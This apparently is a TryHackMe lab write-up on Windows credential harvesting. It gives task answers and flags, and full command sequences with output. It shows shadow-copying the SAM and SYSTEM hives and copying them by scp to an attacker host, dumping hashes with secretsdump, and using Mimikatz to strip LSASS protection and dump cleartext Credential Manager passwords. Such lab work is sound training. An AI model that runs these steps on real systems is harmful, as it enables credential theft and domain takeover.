# Credential Harvesting

## Task1 - Introduction
Learning Objectives
+ Understand the method of extracting credentials from local windows (SAM database)
+ Learn how to access Windows memory and dump clear-text passwords and authentication tickets locally and remotely.
+ Introduction to Windows Credentials Manager and how to extract credentials.
+ Learn methods of extracting credentials for Domain Controller
+ Enumerate the Local Administrator Password Solution (LAPS) feature.
+ Introduction to AD attacks that lead to obtaining credentials.

## Task 2  Credentials Harvesting
```bash
xfreerdp /v:10.10.33.145 /u:thm /p:Passw0rd! /dynamic-resolution 
```

## Task 3  Credential Access
+ Using the "reg query" command, search for the value of the "flag" keyword in the Windows registry? `7tyh4ckm3`
+ Enumerate the AD environment we provided. What is the password of the victim user found in the description section?`Passw0rd!@#`
```bash
c:\Users\thm> reg query HKLM /f password /t REG_SZ /s
#OR
C:\Users\thm> reg query HKCU /f password /t REG_SZ /s


PS C:\Windows\system32> Get-ADUser -Filter * -Properties * | select Name,Description

Name          Description
----          -----------
Administrator Built-in account for administering the computer/domain
Guest         Built-in account for guest access to the computer/domain
krbtgt        Key Distribution Center Service Account
THM User
THM Victim    Change the password: Passw0rd!@#
thm-local
Admin THM
svc-thm
THM Admin BK
test
sshd
```

## Task 4  Local Windows Credentials
+ Follow the technique discussed in this task to dump the content of the SAM database file. What is the NTLM hash for the Administrator account?`98d3a787a80d08385cea7fb4aa2a4261`

+ Open cmd.exe as Administrator
```bash
C:\Windows\system32>wmic shadowcopy call create Volume='C:\'
Executing (Win32_ShadowCopy)->create()
Method execution successful.
Out Parameters:
instance of __PARAMETERS
{
        ReturnValue = 0;
        ShadowID = "{1B46C89E-9D8E-4161-B55B-22E37F5B46DC}";
};

C:\Windows\system32>vssadmin list shadows
vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2013 Microsoft Corp.

Contents of shadow copy set ID: {94387336-30fd-4bc5-bd54-e3e0e4fa2403}
   Contained 1 shadow copies at creation time: 1/19/2024 2:09:21 PM
      Shadow Copy ID: {1b46c89e-9d8e-4161-b55b-22e37f5b46dc}
         Original Volume: (C:)\\?\Volume{19127295-0000-0000-0000-100000000000}\
         Shadow Copy Volume: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
         Originating Machine: Creds-Harvesting-AD.thm.red
         Service Machine: Creds-Harvesting-AD.thm.red
         Provider: 'Microsoft Software Shadow Copy provider 1.0'
         Type: ClientAccessible
         Attributes: Persistent, Client-accessible, No auto release, No writers, Differential

C:\Windows\system32>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\Administrator\Desktop\sam
        1 file(s) copied.

C:\Windows\system32>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\Administrator\Desktop\system
        1 file(s) copied.

C:\Users\Administrator\Desktop>scp sam kali@10.4.37.160:~/TryHackMe
kali@10.4.37.160's password:
sam                                                                                   100%   64KB  64.0KB/s   00:01

C:\Users\Administrator\Desktop>scp system kali@10.4.37.160:~/TryHackMe
kali@10.4.37.160's password:
system                                                                                100%   20MB 965.8KB/s   00:21

C:\Users\Administrator\Desktop>scp creds.txt kali@10.4.37.160:~/TryHackMe
kali@10.4.37.160's password:
creds.txt

┌──(kali㉿kali)-[~/TryHackMe]
└─$ impacket-secretsdump -sam sam -system system LOCAL
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:98d3a787a80d08385cea7fb4aa2a4261:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Cleaning up... 
```

## Task 5  Local Security Authority Subsystem Service (LSASS).
+ Is the LSA protection enabled? (Y|N) `Y`
+ If yes, try removing the protection and dumping the memory using Mimikatz. Once you have done, hit Complete.`No Answer Needed`

```bash
C:\Tools\Mimikatz>mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 May 19 2020 00:48:59
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # !+
[*] 'mimidrv' service not present
[+] 'mimidrv' service successfully registered
[+] 'mimidrv' service ACL to everyone
[+] 'mimidrv' service started

mimikatz # !processprotect /process:lsass.exe /remove
Process : lsass.exe
PID 832 -> 00/00 [0-0-0]

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 714554 (00000000:000ae73a)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 1/19/2024 1:52:54 PM
SID               : S-1-5-90-0-2
        msv :
         [00000003] Primary
         * Username : CREDS-HARVESTIN$
         * Domain   : THM
         * NTLM     : 450745be55df6f5f5864d8d05e205b22
         * SHA1     : 15bf6258ec32fd0310198cb4a7fafb6ee0a3a6b4
        tspkg :
        wdigest :
         * Username : CREDS-HARVESTIN$
         * Domain   : THM
         * Password : (null)
        kerberos :
         * Username : CREDS-HARVESTIN$
         * Domain   : thm.red
         * Password : 3b ea 3a 19 17 a3 7b 1a 7b 9b 29 2b 13 fb cd 99 52 5b cf 6c 66 fc ee 4c b2 da 94 c5 3c 71 21 52 4a 42 9c 10 23 f0 b0 68 3a c7 d0 b9 ae 12 ea da b6 41 94 d9 54 af e5 b8 cc 44 26 9a 0e e7 1c f5 72 d0 20 7c db 9b f9 ac fc 28 d0 54 a1 02 49 ae 0e d0 b5 a3 97 98 29 af 76 a3 cb c5 bf d4 9b c4 ff c6 0b 22 42 8c 0b 59 a7 04 35 be c6 ea 6c 48 de 28 cc c2 fa a2 d0 7c 66 5d 13 52 07 e2 bc 87 a6 a8 d1 d4 a8 56 3e 8f 16 53 65 77 c5 f8 d3 72 cb 5f 05 ef 52 ee 56 da de 68 c5 8a a0 5a a6 e6 97 34 56 bd c0 47 4b ef bf 77 0d 2a 47 19 15 9f f7 1f 16 2e b1 94 15 4c ba 56 cd 85 67 de f1 5f 90 8d 75 3b a8 39 74 5f 17 79 f4 f3 69 ac cc 9d db f9 57 d2 bb 74 71 06 43 13 02 a5 44 bc b5 ee a8 a5 6b c3 9f 0e b0 16 c0 f5 57 24 24 ed 24 dc
        ssp :
        credman :

Authentication Id : 0 ; 63282 (00000000:0000f732)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 1/19/2024 1:51:50 PM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : CREDS-HARVESTIN$
         * Domain   : THM
         * NTLM     : 443e64439d4b7fe780da17fc04a3942a
         * SHA1     : 7a71c63de7dcfce533ce4afff91639743461aa6a
        tspkg :
        wdigest :
         * Username : CREDS-HARVESTIN$
         * Domain   : THM
         * Password : (null)
        kerberos :
         * Username : CREDS-HARVESTIN$
         * Domain   : thm.red
         * Password : 7f 35 fb be 30 0b a0 29 84 77 92 45 16 8b ed 11 a3 0d 4e f5 ff cc 8e 61 d0 f3 f4 05 d5 b8 a9 57 f3 2a 25 f9 5f 74 d7 eb 3f 14 cd e9 21 96 d6 c8 59 17 8b 79 ae 4d c2 88 57 09 84 b1 87 2f 2b 18 44 95 d2 80 f6 90 24 57 79 37 dd 79 57 19 9f 91 d8 99 0f 53 5b c2 54 71 48 80 84 b0 75 77 2e 0e 40 a2 cb 87 38 50 37 2e 84 15 d2 74 4e db 29 11 f9 36 9e af 78 7b 53 c7 14 f8 2a 25 c9 18 f0 65 25 d3 22 84 a9 a4 7b 92 93 34 9a 49 e9 fc 76 56 32 35 e3 f2 8a 12 c3 30 e1 26 0a 67 ce 08 28 76 81 74 f4 55 fd 7b e4 0a 5c 8d 70 22 8a 6b 27 ea 7c d8 da 09 0b e5 4e 89 09 5b 21 1b 63 21 ec b2 48 24 95 24 8f 59 0c 05 fd 54 9d 4e c6 99 67 69 b2 de 76 20 c9 a1 06 a2 e6 fb 8c 7b 14 86 9d 4c 0f 10 2b b7 6d df d2 f3 6e cf d4 b2 71 da 06 2d
        ssp :
        credman :

Authentication Id : 0 ; 63264 (00000000:0000f720)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 1/19/2024 1:51:50 PM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : CREDS-HARVESTIN$
         * Domain   : THM
         * NTLM     : 450745be55df6f5f5864d8d05e205b22
         * SHA1     : 15bf6258ec32fd0310198cb4a7fafb6ee0a3a6b4
        tspkg :
        wdigest :
         * Username : CREDS-HARVESTIN$
         * Domain   : THM
         * Password : (null)
        kerberos :
         * Username : CREDS-HARVESTIN$
         * Domain   : thm.red
         * Password : 3b ea 3a 19 17 a3 7b 1a 7b 9b 29 2b 13 fb cd 99 52 5b cf 6c 66 fc ee 4c b2 da 94 c5 3c 71 21 52 4a 42 9c 10 23 f0 b0 68 3a c7 d0 b9 ae 12 ea da b6 41 94 d9 54 af e5 b8 cc 44 26 9a 0e e7 1c f5 72 d0 20 7c db 9b f9 ac fc 28 d0 54 a1 02 49 ae 0e d0 b5 a3 97 98 29 af 76 a3 cb c5 bf d4 9b c4 ff c6 0b 22 42 8c 0b 59 a7 04 35 be c6 ea 6c 48 de 28 cc c2 fa a2 d0 7c 66 5d 13 52 07 e2 bc 87 a6 a8 d1 d4 a8 56 3e 8f 16 53 65 77 c5 f8 d3 72 cb 5f 05 ef 52 ee 56 da de 68 c5 8a a0 5a a6 e6 97 34 56 bd c0 47 4b ef bf 77 0d 2a 47 19 15 9f f7 1f 16 2e b1 94 15 4c ba 56 cd 85 67 de f1 5f 90 8d 75 3b a8 39 74 5f 17 79 f4 f3 69 ac cc 9d db f9 57 d2 bb 74 71 06 43 13 02 a5 44 bc b5 ee a8 a5 6b c3 9f 0e b0 16 c0 f5 57 24 24 ed 24 dc
        ssp :
        credman :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : CREDS-HARVESTIN$
Domain            : THM
Logon Server      : (null)
Logon Time        : 1/19/2024 1:51:49 PM
SID               : S-1-5-20
        msv :
         [00000003] Primary
         * Username : CREDS-HARVESTIN$
         * Domain   : THM
         * NTLM     : 450745be55df6f5f5864d8d05e205b22
         * SHA1     : 15bf6258ec32fd0310198cb4a7fafb6ee0a3a6b4
        tspkg :
        wdigest :
         * Username : CREDS-HARVESTIN$
         * Domain   : THM
         * Password : (null)
        kerberos :
         * Username : creds-harvestin$
         * Domain   : THM.RED
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 34290 (00000000:000085f2)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 1/19/2024 1:51:48 PM
SID               : S-1-5-96-0-0
        msv :
         [00000003] Primary
         * Username : CREDS-HARVESTIN$
         * Domain   : THM
         * NTLM     : 450745be55df6f5f5864d8d05e205b22
         * SHA1     : 15bf6258ec32fd0310198cb4a7fafb6ee0a3a6b4
        tspkg :
        wdigest :
         * Username : CREDS-HARVESTIN$
         * Domain   : THM
         * Password : (null)
        kerberos :
         * Username : CREDS-HARVESTIN$
         * Domain   : thm.red
         * Password : 3b ea 3a 19 17 a3 7b 1a 7b 9b 29 2b 13 fb cd 99 52 5b cf 6c 66 fc ee 4c b2 da 94 c5 3c 71 21 52 4a 42 9c 10 23 f0 b0 68 3a c7 d0 b9 ae 12 ea da b6 41 94 d9 54 af e5 b8 cc 44 26 9a 0e e7 1c f5 72 d0 20 7c db 9b f9 ac fc 28 d0 54 a1 02 49 ae 0e d0 b5 a3 97 98 29 af 76 a3 cb c5 bf d4 9b c4 ff c6 0b 22 42 8c 0b 59 a7 04 35 be c6 ea 6c 48 de 28 cc c2 fa a2 d0 7c 66 5d 13 52 07 e2 bc 87 a6 a8 d1 d4 a8 56 3e 8f 16 53 65 77 c5 f8 d3 72 cb 5f 05 ef 52 ee 56 da de 68 c5 8a a0 5a a6 e6 97 34 56 bd c0 47 4b ef bf 77 0d 2a 47 19 15 9f f7 1f 16 2e b1 94 15 4c ba 56 cd 85 67 de f1 5f 90 8d 75 3b a8 39 74 5f 17 79 f4 f3 69 ac cc 9d db f9 57 d2 bb 74 71 06 43 13 02 a5 44 bc b5 ee a8 a5 6b c3 9f 0e b0 16 c0 f5 57 24 24 ed 24 dc
        ssp :
        credman :

Authentication Id : 0 ; 34292 (00000000:000085f4)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 1/19/2024 1:51:48 PM
SID               : S-1-5-96-0-1
        msv :
         [00000003] Primary
         * Username : CREDS-HARVESTIN$
         * Domain   : THM
         * NTLM     : 450745be55df6f5f5864d8d05e205b22
         * SHA1     : 15bf6258ec32fd0310198cb4a7fafb6ee0a3a6b4
        tspkg :
        wdigest :
         * Username : CREDS-HARVESTIN$
         * Domain   : THM
         * Password : (null)
        kerberos :
         * Username : CREDS-HARVESTIN$
         * Domain   : thm.red
         * Password : 3b ea 3a 19 17 a3 7b 1a 7b 9b 29 2b 13 fb cd 99 52 5b cf 6c 66 fc ee 4c b2 da 94 c5 3c 71 21 52 4a 42 9c 10 23 f0 b0 68 3a c7 d0 b9 ae 12 ea da b6 41 94 d9 54 af e5 b8 cc 44 26 9a 0e e7 1c f5 72 d0 20 7c db 9b f9 ac fc 28 d0 54 a1 02 49 ae 0e d0 b5 a3 97 98 29 af 76 a3 cb c5 bf d4 9b c4 ff c6 0b 22 42 8c 0b 59 a7 04 35 be c6 ea 6c 48 de 28 cc c2 fa a2 d0 7c 66 5d 13 52 07 e2 bc 87 a6 a8 d1 d4 a8 56 3e 8f 16 53 65 77 c5 f8 d3 72 cb 5f 05 ef 52 ee 56 da de 68 c5 8a a0 5a a6 e6 97 34 56 bd c0 47 4b ef bf 77 0d 2a 47 19 15 9f f7 1f 16 2e b1 94 15 4c ba 56 cd 85 67 de f1 5f 90 8d 75 3b a8 39 74 5f 17 79 f4 f3 69 ac cc 9d db f9 57 d2 bb 74 71 06 43 13 02 a5 44 bc b5 ee a8 a5 6b c3 9f 0e b0 16 c0 f5 57 24 24 ed 24 dc
        ssp :
        credman :

Authentication Id : 0 ; 806060 (00000000:000c4cac)
Session           : RemoteInteractive from 2
User Name         : thm
Domain            : THM
Logon Server      : CREDS-HARVESTIN
Logon Time        : 1/19/2024 1:53:10 PM
SID               : S-1-5-21-1966530601-3185510712-10604624-1114
        msv :
         [00000003] Primary
         * Username : thm
         * Domain   : THM
         * NTLM     : fc525c9683e8fe067095ba2ddc971889
         * SHA1     : e53d7244aa8727f5789b01d8959141960aad5d22
         * DPAPI    : cd09e2e4f70ef660400b8358c52a46b8
        tspkg :
        wdigest :
         * Username : thm
         * Domain   : THM
         * Password : (null)
        kerberos :
         * Username : thm
         * Domain   : THM.RED
         * Password : (null)
        ssp :
        credman :
         [00000000]
         * Username : thm
         * Domain   : 10.10.237.226
         * Password : jfxKruLkkxoPjwe3
         [00000001]
         * Username : thm.red\thm-local
         * Domain   : thm.red\thm-local
         * Password : Passw0rd123

Authentication Id : 0 ; 805940 (00000000:000c4c34)
Session           : RemoteInteractive from 2
User Name         : thm
Domain            : THM
Logon Server      : CREDS-HARVESTIN
Logon Time        : 1/19/2024 1:53:10 PM
SID               : S-1-5-21-1966530601-3185510712-10604624-1114
        msv :
         [00000003] Primary
         * Username : thm
         * Domain   : THM
         * NTLM     : fc525c9683e8fe067095ba2ddc971889
         * SHA1     : e53d7244aa8727f5789b01d8959141960aad5d22
         * DPAPI    : cd09e2e4f70ef660400b8358c52a46b8
        tspkg :
        wdigest :
         * Username : thm
         * Domain   : THM
         * Password : (null)
        kerberos :
         * Username : thm
         * Domain   : THM.RED
         * Password : (null)
        ssp :
        credman :
         [00000000]
         * Username : thm
         * Domain   : 10.10.237.226
         * Password : jfxKruLkkxoPjwe3
         [00000001]
         * Username : thm.red\thm-local
         * Domain   : thm.red\thm-local
         * Password : Passw0rd123

Authentication Id : 0 ; 714924 (00000000:000ae8ac)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 1/19/2024 1:52:54 PM
SID               : S-1-5-90-0-2
        msv :
         [00000003] Primary
         * Username : CREDS-HARVESTIN$
         * Domain   : THM
         * NTLM     : 450745be55df6f5f5864d8d05e205b22
         * SHA1     : 15bf6258ec32fd0310198cb4a7fafb6ee0a3a6b4
        tspkg :
        wdigest :
         * Username : CREDS-HARVESTIN$
         * Domain   : THM
         * Password : (null)
        kerberos :
         * Username : CREDS-HARVESTIN$
         * Domain   : thm.red
         * Password : 3b ea 3a 19 17 a3 7b 1a 7b 9b 29 2b 13 fb cd 99 52 5b cf 6c 66 fc ee 4c b2 da 94 c5 3c 71 21 52 4a 42 9c 10 23 f0 b0 68 3a c7 d0 b9 ae 12 ea da b6 41 94 d9 54 af e5 b8 cc 44 26 9a 0e e7 1c f5 72 d0 20 7c db 9b f9 ac fc 28 d0 54 a1 02 49 ae 0e d0 b5 a3 97 98 29 af 76 a3 cb c5 bf d4 9b c4 ff c6 0b 22 42 8c 0b 59 a7 04 35 be c6 ea 6c 48 de 28 cc c2 fa a2 d0 7c 66 5d 13 52 07 e2 bc 87 a6 a8 d1 d4 a8 56 3e 8f 16 53 65 77 c5 f8 d3 72 cb 5f 05 ef 52 ee 56 da de 68 c5 8a a0 5a a6 e6 97 34 56 bd c0 47 4b ef bf 77 0d 2a 47 19 15 9f f7 1f 16 2e b1 94 15 4c ba 56 cd 85 67 de f1 5f 90 8d 75 3b a8 39 74 5f 17 79 f4 f3 69 ac cc 9d db f9 57 d2 bb 74 71 06 43 13 02 a5 44 bc b5 ee a8 a5 6b c3 9f 0e b0 16 c0 f5 57 24 24 ed 24 dc
        ssp :
        credman :

Authentication Id : 0 ; 713209 (00000000:000ae1f9)
Session           : Interactive from 2
User Name         : UMFD-2
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 1/19/2024 1:52:54 PM
SID               : S-1-5-96-0-2
        msv :
         [00000003] Primary
         * Username : CREDS-HARVESTIN$
         * Domain   : THM
         * NTLM     : 450745be55df6f5f5864d8d05e205b22
         * SHA1     : 15bf6258ec32fd0310198cb4a7fafb6ee0a3a6b4
        tspkg :
        wdigest :
         * Username : CREDS-HARVESTIN$
         * Domain   : THM
         * Password : (null)
        kerberos :
         * Username : CREDS-HARVESTIN$
         * Domain   : thm.red
         * Password : 3b ea 3a 19 17 a3 7b 1a 7b 9b 29 2b 13 fb cd 99 52 5b cf 6c 66 fc ee 4c b2 da 94 c5 3c 71 21 52 4a 42 9c 10 23 f0 b0 68 3a c7 d0 b9 ae 12 ea da b6 41 94 d9 54 af e5 b8 cc 44 26 9a 0e e7 1c f5 72 d0 20 7c db 9b f9 ac fc 28 d0 54 a1 02 49 ae 0e d0 b5 a3 97 98 29 af 76 a3 cb c5 bf d4 9b c4 ff c6 0b 22 42 8c 0b 59 a7 04 35 be c6 ea 6c 48 de 28 cc c2 fa a2 d0 7c 66 5d 13 52 07 e2 bc 87 a6 a8 d1 d4 a8 56 3e 8f 16 53 65 77 c5 f8 d3 72 cb 5f 05 ef 52 ee 56 da de 68 c5 8a a0 5a a6 e6 97 34 56 bd c0 47 4b ef bf 77 0d 2a 47 19 15 9f f7 1f 16 2e b1 94 15 4c ba 56 cd 85 67 de f1 5f 90 8d 75 3b a8 39 74 5f 17 79 f4 f3 69 ac cc 9d db f9 57 d2 bb 74 71 06 43 13 02 a5 44 bc b5 ee a8 a5 6b c3 9f 0e b0 16 c0 f5 57 24 24 ed 24 dc
        ssp :
        credman :

Authentication Id : 0 ; 713155 (00000000:000ae1c3)
Session           : Interactive from 2
User Name         : UMFD-2
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 1/19/2024 1:52:54 PM
SID               : S-1-5-96-0-2
        msv :
         [00000003] Primary
         * Username : CREDS-HARVESTIN$
         * Domain   : THM
         * NTLM     : 450745be55df6f5f5864d8d05e205b22
         * SHA1     : 15bf6258ec32fd0310198cb4a7fafb6ee0a3a6b4
        tspkg :
        wdigest :
         * Username : CREDS-HARVESTIN$
         * Domain   : THM
         * Password : (null)
        kerberos :
         * Username : CREDS-HARVESTIN$
         * Domain   : thm.red
         * Password : 3b ea 3a 19 17 a3 7b 1a 7b 9b 29 2b 13 fb cd 99 52 5b cf 6c 66 fc ee 4c b2 da 94 c5 3c 71 21 52 4a 42 9c 10 23 f0 b0 68 3a c7 d0 b9 ae 12 ea da b6 41 94 d9 54 af e5 b8 cc 44 26 9a 0e e7 1c f5 72 d0 20 7c db 9b f9 ac fc 28 d0 54 a1 02 49 ae 0e d0 b5 a3 97 98 29 af 76 a3 cb c5 bf d4 9b c4 ff c6 0b 22 42 8c 0b 59 a7 04 35 be c6 ea 6c 48 de 28 cc c2 fa a2 d0 7c 66 5d 13 52 07 e2 bc 87 a6 a8 d1 d4 a8 56 3e 8f 16 53 65 77 c5 f8 d3 72 cb 5f 05 ef 52 ee 56 da de 68 c5 8a a0 5a a6 e6 97 34 56 bd c0 47 4b ef bf 77 0d 2a 47 19 15 9f f7 1f 16 2e b1 94 15 4c ba 56 cd 85 67 de f1 5f 90 8d 75 3b a8 39 74 5f 17 79 f4 f3 69 ac cc 9d db f9 57 d2 bb 74 71 06 43 13 02 a5 44 bc b5 ee a8 a5 6b c3 9f 0e b0 16 c0 f5 57 24 24 ed 24 dc
        ssp :
        credman :

Authentication Id : 0 ; 995 (00000000:000003e3)
Session           : Service from 0
User Name         : IUSR
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 1/19/2024 1:52:07 PM
SID               : S-1-5-17
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 1/19/2024 1:51:51 PM
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 34512 (00000000:000086d0)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 1/19/2024 1:51:48 PM
SID               : S-1-5-96-0-1
        msv :
         [00000003] Primary
         * Username : CREDS-HARVESTIN$
         * Domain   : THM
         * NTLM     : 443e64439d4b7fe780da17fc04a3942a
         * SHA1     : 7a71c63de7dcfce533ce4afff91639743461aa6a
        tspkg :
        wdigest :
         * Username : CREDS-HARVESTIN$
         * Domain   : THM
         * Password : (null)
        kerberos :
         * Username : CREDS-HARVESTIN$
         * Domain   : thm.red
         * Password : 7f 35 fb be 30 0b a0 29 84 77 92 45 16 8b ed 11 a3 0d 4e f5 ff cc 8e 61 d0 f3 f4 05 d5 b8 a9 57 f3 2a 25 f9 5f 74 d7 eb 3f 14 cd e9 21 96 d6 c8 59 17 8b 79 ae 4d c2 88 57 09 84 b1 87 2f 2b 18 44 95 d2 80 f6 90 24 57 79 37 dd 79 57 19 9f 91 d8 99 0f 53 5b c2 54 71 48 80 84 b0 75 77 2e 0e 40 a2 cb 87 38 50 37 2e 84 15 d2 74 4e db 29 11 f9 36 9e af 78 7b 53 c7 14 f8 2a 25 c9 18 f0 65 25 d3 22 84 a9 a4 7b 92 93 34 9a 49 e9 fc 76 56 32 35 e3 f2 8a 12 c3 30 e1 26 0a 67 ce 08 28 76 81 74 f4 55 fd 7b e4 0a 5c 8d 70 22 8a 6b 27 ea 7c d8 da 09 0b e5 4e 89 09 5b 21 1b 63 21 ec b2 48 24 95 24 8f 59 0c 05 fd 54 9d 4e c6 99 67 69 b2 de 76 20 c9 a1 06 a2 e6 fb 8c 7b 14 86 9d 4c 0f 10 2b b7 6d df d2 f3 6e cf d4 b2 71 da 06 2d
        ssp :
        credman :

Authentication Id : 0 ; 34510 (00000000:000086ce)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 1/19/2024 1:51:48 PM
SID               : S-1-5-96-0-0
        msv :
         [00000003] Primary
         * Username : CREDS-HARVESTIN$
         * Domain   : THM
         * NTLM     : 443e64439d4b7fe780da17fc04a3942a
         * SHA1     : 7a71c63de7dcfce533ce4afff91639743461aa6a
        tspkg :
        wdigest :
         * Username : CREDS-HARVESTIN$
         * Domain   : THM
         * Password : (null)
        kerberos :
         * Username : CREDS-HARVESTIN$
         * Domain   : thm.red
         * Password : 7f 35 fb be 30 0b a0 29 84 77 92 45 16 8b ed 11 a3 0d 4e f5 ff cc 8e 61 d0 f3 f4 05 d5 b8 a9 57 f3 2a 25 f9 5f 74 d7 eb 3f 14 cd e9 21 96 d6 c8 59 17 8b 79 ae 4d c2 88 57 09 84 b1 87 2f 2b 18 44 95 d2 80 f6 90 24 57 79 37 dd 79 57 19 9f 91 d8 99 0f 53 5b c2 54 71 48 80 84 b0 75 77 2e 0e 40 a2 cb 87 38 50 37 2e 84 15 d2 74 4e db 29 11 f9 36 9e af 78 7b 53 c7 14 f8 2a 25 c9 18 f0 65 25 d3 22 84 a9 a4 7b 92 93 34 9a 49 e9 fc 76 56 32 35 e3 f2 8a 12 c3 30 e1 26 0a 67 ce 08 28 76 81 74 f4 55 fd 7b e4 0a 5c 8d 70 22 8a 6b 27 ea 7c d8 da 09 0b e5 4e 89 09 5b 21 1b 63 21 ec b2 48 24 95 24 8f 59 0c 05 fd 54 9d 4e c6 99 67 69 b2 de 76 20 c9 a1 06 a2 e6 fb 8c 7b 14 86 9d 4c 0f 10 2b b7 6d df d2 f3 6e cf d4 b2 71 da 06 2d
        ssp :
        credman :

Authentication Id : 0 ; 31605 (00000000:00007b75)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 1/19/2024 1:51:40 PM
SID               :
        msv :
         [00000003] Primary
         * Username : CREDS-HARVESTIN$
         * Domain   : THM
         * NTLM     : 450745be55df6f5f5864d8d05e205b22
         * SHA1     : 15bf6258ec32fd0310198cb4a7fafb6ee0a3a6b4
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : CREDS-HARVESTIN$
Domain            : THM
Logon Server      : (null)
Logon Time        : 1/19/2024 1:51:39 PM
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : CREDS-HARVESTIN$
         * Domain   : THM
         * Password : (null)
        kerberos :
         * Username : creds-harvestin$
         * Domain   : THM.RED
         * Password : (null)
        ssp :
        credman :
```

## Task 6  Windows Credential Manager
+ Apply the technique for extracting clear-text passwords from Windows Credential Manager. What is the password of the THMuser for internal-app.thm.red? `E4syPassw0rd`
+ Use Mimikatz to memory dump the credentials for the 10.10.237.226 SMB share which is stored in the Windows Credential vault. What is the password?`jfxKruLkkxoPjwe3`
+ Run cmd.exe under thm-local user via runas and read the flag in "c:\Users\thm-local\Saved Games\flag.txt". What is the flag?`THM{RunA5S4veCr3ds}`

```bash
C:\Tools\Mimikatz>cmdkey /list

Currently stored credentials:

    Target: LegacyGeneric:target=10.10.237.226
    Type: Generic
    User: thm

    Target: Domain:interactive=thm.red\thm-local
    Type: Domain Password
    User: thm.red\thm-local


C:\Tools\Mimikatz>mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 May 19 2020 00:48:59
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::credman

Authentication Id : 0 ; 714554 (00000000:000ae73a)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 1/19/2024 1:52:54 PM
SID               : S-1-5-90-0-2
        credman :

Authentication Id : 0 ; 63282 (00000000:0000f732)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 1/19/2024 1:51:50 PM
SID               : S-1-5-90-0-1
        credman :

Authentication Id : 0 ; 63264 (00000000:0000f720)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 1/19/2024 1:51:50 PM
SID               : S-1-5-90-0-1
        credman :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : CREDS-HARVESTIN$
Domain            : THM
Logon Server      : (null)
Logon Time        : 1/19/2024 1:51:49 PM
SID               : S-1-5-20
        credman :

Authentication Id : 0 ; 34290 (00000000:000085f2)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 1/19/2024 1:51:48 PM
SID               : S-1-5-96-0-0
        credman :

